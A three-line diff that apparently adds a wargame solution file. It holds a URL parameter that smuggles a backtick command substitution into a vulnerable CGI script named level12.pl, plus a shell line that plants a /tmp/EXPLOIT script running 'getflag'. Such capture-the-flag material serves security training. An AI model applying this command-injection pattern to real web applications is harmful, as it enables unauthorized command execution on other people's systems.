@@ -1,0 +1,3 @@
+level12.pl?x=`/*/EXPLOIT`
+
+echo "\`getflag > /tmp/flag\`" > /tmp/EXPLOIT 
